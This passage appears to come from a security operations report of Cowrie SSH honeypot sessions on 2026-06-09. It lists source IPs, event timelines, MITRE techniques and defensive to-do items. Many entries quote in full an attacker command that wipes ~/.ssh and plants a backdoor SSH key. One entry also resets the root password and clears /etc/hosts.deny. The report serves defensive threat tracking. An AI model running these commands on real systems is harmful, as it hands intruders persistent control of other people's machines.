| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:18:40` | `cowrie.session.connect` |
| `2026-06-09 12:18:40` | `cowrie.client.version` |
| `2026-06-09 12:18:40` | `cowrie.client.kex` |
| `2026-06-09 12:18:40` | `cowrie.login.success` |
| `2026-06-09 12:18:40` | `cowrie.session.params` |
| `2026-06-09 12:18:40` | `cowrie.command.input` |
| `2026-06-09 12:18:40` | `cowrie.command.failed` |
| `2026-06-09 12:18:40` | `cowrie.log.closed` |
| `2026-06-09 12:18:40` | `cowrie.session.params` |
| `2026-06-09 12:18:40` | `cowrie.command.input` |
| `2026-06-09 12:18:40` | `cowrie.session.file_download` |
| `2026-06-09 12:18:40` | `cowrie.log.closed` |
| `2026-06-09 12:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfde9821e49e

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:18 |
| **Last Seen** | 2026-06-09 12:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:18:41` | `cowrie.session.connect` |
| `2026-06-09 12:18:41` | `cowrie.client.version` |
| `2026-06-09 12:18:41` | `cowrie.client.kex` |
| `2026-06-09 12:18:41` | `cowrie.login.success` |
| `2026-06-09 12:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-265e2032b72f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.50[.]133` |
| **First Seen** | 2026-06-09 12:24 |
| **Last Seen** | 2026-06-09 12:29 |
| **Session Duration** | 319s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:24:28` | `cowrie.session.connect` |
| `2026-06-09 12:24:31` | `cowrie.client.version` |
| `2026-06-09 12:24:42` | `cowrie.client.kex` |
| `2026-06-09 12:24:47` | `cowrie.login.success` |
| `2026-06-09 12:29:47` | `cowrie.session.file_upload` |
| `2026-06-09 12:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.50[.]133` to AbuseIPDB if not already reported
- [ ] Block `120.48.50[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2830031891de

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-09 12:24 |
| **Last Seen** | 2026-06-09 12:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:24:39` | `cowrie.session.connect` |
| `2026-06-09 12:24:39` | `cowrie.client.version` |
| `2026-06-09 12:24:39` | `cowrie.client.kex` |
| `2026-06-09 12:24:40` | `cowrie.login.success` |
| `2026-06-09 12:24:40` | `cowrie.session.params` |
| `2026-06-09 12:24:40` | `cowrie.command.input` |
| `2026-06-09 12:24:40` | `cowrie.command.failed` |
| `2026-06-09 12:24:40` | `cowrie.log.closed` |
| `2026-06-09 12:24:40` | `cowrie.session.params` |
| `2026-06-09 12:24:40` | `cowrie.command.input` |
| `2026-06-09 12:24:40` | `cowrie.session.file_download` |
| `2026-06-09 12:24:40` | `cowrie.log.closed` |
| `2026-06-09 12:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b12b3575cb5

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-06-09 12:24 |
| **Last Seen** | 2026-06-09 12:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:24:42` | `cowrie.session.connect` |
| `2026-06-09 12:24:42` | `cowrie.client.version` |
| `2026-06-09 12:24:42` | `cowrie.client.kex` |
| `2026-06-09 12:24:42` | `cowrie.login.success` |
| `2026-06-09 12:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b5172b3eba

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:26 |
| **Last Seen** | 2026-06-09 12:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:26:40` | `cowrie.session.connect` |
| `2026-06-09 12:26:40` | `cowrie.client.version` |
| `2026-06-09 12:26:40` | `cowrie.client.kex` |
| `2026-06-09 12:26:41` | `cowrie.login.success` |
| `2026-06-09 12:26:42` | `cowrie.session.params` |
| `2026-06-09 12:26:42` | `cowrie.command.input` |
| `2026-06-09 12:26:42` | `cowrie.command.failed` |
| `2026-06-09 12:26:43` | `cowrie.log.closed` |
| `2026-06-09 12:26:43` | `cowrie.session.params` |
| `2026-06-09 12:26:43` | `cowrie.command.input` |
| `2026-06-09 12:26:43` | `cowrie.session.file_download` |
| `2026-06-09 12:26:43` | `cowrie.log.closed` |
| `2026-06-09 12:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdb21fe5d695

| Field | Detail |
|---|---|
| **Source IP** | `103.143.10[.]140` |
| **First Seen** | 2026-06-09 12:26 |
| **Last Seen** | 2026-06-09 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:26:46` | `cowrie.session.connect` |
| `2026-06-09 12:26:46` | `cowrie.client.version` |
| `2026-06-09 12:26:47` | `cowrie.client.kex` |
| `2026-06-09 12:26:48` | `cowrie.login.success` |
| `2026-06-09 12:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.10[.]140` to AbuseIPDB if not already reported
- [ ] Block `103.143.10[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b47416ec7db

| Field | Detail |
|---|---|
| **Source IP** | `116.233.39[.]105` |
| **First Seen** | 2026-06-09 12:36 |
| **Last Seen** | 2026-06-09 12:36 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2kIxsT3c4U9P"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:36:35` | `cowrie.session.connect` |
| `2026-06-09 12:36:35` | `cowrie.client.version` |
| `2026-06-09 12:36:35` | `cowrie.client.kex` |
| `2026-06-09 12:36:36` | `cowrie.login.success` |
| `2026-06-09 12:36:36` | `cowrie.session.params` |
| `2026-06-09 12:36:36` | `cowrie.command.input` |
| `2026-06-09 12:36:36` | `cowrie.command.failed` |
| `2026-06-09 12:36:36` | `cowrie.log.closed` |
| `2026-06-09 12:36:37` | `cowrie.session.params` |
| `2026-06-09 12:36:37` | `cowrie.command.input` |
| `2026-06-09 12:36:37` | `cowrie.session.file_download` |
| `2026-06-09 12:36:37` | `cowrie.log.closed` |
| `2026-06-09 12:36:49` | `cowrie.session.params` |
| `2026-06-09 12:36:49` | `cowrie.command.input` |
| `2026-06-09 12:36:49` | `cowrie.log.closed` |
| `2026-06-09 12:36:50` | `cowrie.session.params` |
| `2026-06-09 12:36:50` | `cowrie.command.input` |
| `2026-06-09 12:36:50` | `cowrie.log.closed` |
| `2026-06-09 12:36:50` | `cowrie.session.params` |
| `2026-06-09 12:36:50` | `cowrie.command.input` |
| `2026-06-09 12:36:50` | `cowrie.session.file_download` |
| `2026-06-09 12:36:50` | `cowrie.log.closed` |
| `2026-06-09 12:36:50` | `cowrie.session.params` |
| `2026-06-09 12:36:50` | `cowrie.command.input` |
| `2026-06-09 12:36:51` | `cowrie.log.closed` |
| `2026-06-09 12:36:51` | `cowrie.session.params` |
| `2026-06-09 12:36:51` | `cowrie.command.input` |
| `2026-06-09 12:36:51` | `cowrie.log.closed` |
| `2026-06-09 12:36:51` | `cowrie.session.params` |
| `2026-06-09 12:36:51` | `cowrie.command.input` |
| `2026-06-09 12:36:51` | `cowrie.command.input` |
| `2026-06-09 12:36:52` | `cowrie.log.closed` |
| `2026-06-09 12:36:52` | `cowrie.session.params` |
| `2026-06-09 12:36:52` | `cowrie.command.input` |
| `2026-06-09 12:36:52` | `cowrie.log.closed` |
| `2026-06-09 12:36:52` | `cowrie.session.params` |
| `2026-06-09 12:36:52` | `cowrie.command.input` |
| `2026-06-09 12:36:52` | `cowrie.log.closed` |
| `2026-06-09 12:36:53` | `cowrie.session.params` |
| `2026-06-09 12:36:53` | `cowrie.command.input` |
| `2026-06-09 12:36:53` | `cowrie.log.closed` |
| `2026-06-09 12:36:53` | `cowrie.session.params` |
| `2026-06-09 12:36:53` | `cowrie.command.input` |
| `2026-06-09 12:36:53` | `cowrie.log.closed` |
| `2026-06-09 12:36:54` | `cowrie.session.params` |
| `2026-06-09 12:36:54` | `cowrie.command.input` |
| `2026-06-09 12:36:54` | `cowrie.log.closed` |
| `2026-06-09 12:36:54` | `cowrie.session.params` |
| `2026-06-09 12:36:54` | `cowrie.command.input` |
| `2026-06-09 12:36:54` | `cowrie.log.closed` |
| `2026-06-09 12:36:55` | `cowrie.session.params` |
| `2026-06-09 12:36:55` | `cowrie.command.input` |
| `2026-06-09 12:36:55` | `cowrie.log.closed` |
| `2026-06-09 12:36:55` | `cowrie.session.params` |
| `2026-06-09 12:36:55` | `cowrie.command.input` |
| `2026-06-09 12:36:55` | `cowrie.log.closed` |
| `2026-06-09 12:36:56` | `cowrie.session.params` |
| `2026-06-09 12:36:56` | `cowrie.command.input` |
| `2026-06-09 12:36:56` | `cowrie.log.closed` |
| `2026-06-09 12:36:56` | `cowrie.session.params` |
| `2026-06-09 12:36:56` | `cowrie.command.input` |
| `2026-06-09 12:36:56` | `cowrie.log.closed` |
| `2026-06-09 12:36:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.233.39[.]105` to AbuseIPDB if not already reported
- [ ] Block `116.233.39[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aabce075465e

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:41 |
| **Last Seen** | 2026-06-09 12:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:41:33` | `cowrie.session.connect` |
| `2026-06-09 12:41:33` | `cowrie.client.version` |
| `2026-06-09 12:41:33` | `cowrie.client.kex` |
| `2026-06-09 12:41:33` | `cowrie.login.success` |
| `2026-06-09 12:41:33` | `cowrie.session.params` |
| `2026-06-09 12:41:33` | `cowrie.command.input` |
| `2026-06-09 12:41:33` | `cowrie.command.failed` |
| `2026-06-09 12:41:33` | `cowrie.log.closed` |
| `2026-06-09 12:41:33` | `cowrie.session.params` |
| `2026-06-09 12:41:33` | `cowrie.command.input` |
| `2026-06-09 12:41:33` | `cowrie.session.file_download` |
| `2026-06-09 12:41:33` | `cowrie.log.closed` |
| `2026-06-09 12:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1244d921e663

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:41 |
| **Last Seen** | 2026-06-09 12:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:41:34` | `cowrie.session.connect` |
| `2026-06-09 12:41:34` | `cowrie.client.version` |
| `2026-06-09 12:41:34` | `cowrie.client.kex` |
| `2026-06-09 12:41:34` | `cowrie.login.success` |
| `2026-06-09 12:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84cabfe1ee9e

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 12:42 |
| **Last Seen** | 2026-06-09 12:42 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:42:03` | `cowrie.session.connect` |
| `2026-06-09 12:42:04` | `cowrie.client.version` |
| `2026-06-09 12:42:04` | `cowrie.client.kex` |
| `2026-06-09 12:42:10` | `cowrie.login.success` |
| `2026-06-09 12:42:13` | `cowrie.session.params` |
| `2026-06-09 12:42:13` | `cowrie.command.input` |
| `2026-06-09 12:42:13` | `cowrie.command.failed` |
| `2026-06-09 12:42:15` | `cowrie.log.closed` |
| `2026-06-09 12:42:15` | `cowrie.session.params` |
| `2026-06-09 12:42:15` | `cowrie.command.input` |
| `2026-06-09 12:42:18` | `cowrie.session.file_download` |
| `2026-06-09 12:42:18` | `cowrie.log.closed` |
| `2026-06-09 12:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80f13dd4289b

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 12:42 |
| **Last Seen** | 2026-06-09 12:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:42:33` | `cowrie.session.connect` |
| `2026-06-09 12:42:34` | `cowrie.client.version` |
| `2026-06-09 12:42:34` | `cowrie.client.kex` |
| `2026-06-09 12:42:39` | `cowrie.login.success` |
| `2026-06-09 12:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.74.68[.]248` to AbuseIPDB if not already reported
- [ ] Block `40.74.68[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e2642f7daf

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:43 |
| **Last Seen** | 2026-06-09 12:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:43:49` | `cowrie.session.connect` |
| `2026-06-09 12:43:49` | `cowrie.client.version` |
| `2026-06-09 12:43:49` | `cowrie.client.kex` |
| `2026-06-09 12:43:49` | `cowrie.login.success` |
| `2026-06-09 12:43:49` | `cowrie.session.params` |
| `2026-06-09 12:43:49` | `cowrie.command.input` |
| `2026-06-09 12:43:49` | `cowrie.command.failed` |
| `2026-06-09 12:43:49` | `cowrie.log.closed` |
| `2026-06-09 12:43:49` | `cowrie.session.params` |
| `2026-06-09 12:43:49` | `cowrie.command.input` |
| `2026-06-09 12:43:49` | `cowrie.session.file_download` |
| `2026-06-09 12:43:49` | `cowrie.log.closed` |
| `2026-06-09 12:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a78a002b3b2

| Field | Detail |
|---|---|
| **Source IP** | `135.13.28[.]35` |
| **First Seen** | 2026-06-09 12:43 |
| **Last Seen** | 2026-06-09 12:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 12:43:51` | `cowrie.session.connect` |
| `2026-06-09 12:43:51` | `cowrie.client.version` |
| `2026-06-09 12:43:51` | `cowrie.client.kex` |
| `2026-06-09 12:43:51` | `cowrie.login.success` |
| `2026-06-09 12:43:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `135.13.28[.]35` to AbuseIPDB if not already reported
- [ ] Block `135.13.28[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab0590a8bf0

| Field | Detail |
|---|---|
| **Source IP** | `40.74.68[.]248` |
| **First Seen** | 2026-06-09 13:08 |
| **Last Seen** | 2026-06-09 13:08 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 13:08:14` | `cowrie.session.connect` |
| `2026-06-09 13:08:15` | `cowrie.client.version` |
| `2026-06-09 13:08:15` | `cowrie.client.kex` |
| `2026-06-09 13:08:25` | `cowrie.login.success` |
| `2026-06-09 13:08:26` | `cowrie.session.params` |
| `2026-06-09 13:08:26` | `cowrie.command.input` |
| `2026-06-09 13:08:26` | `cowrie.command.failed` |
| `2026-06-09 13:08:27` | `cowrie.log.closed` |
| `2026-06-09 13:08:30` | `cowrie.session.params` |
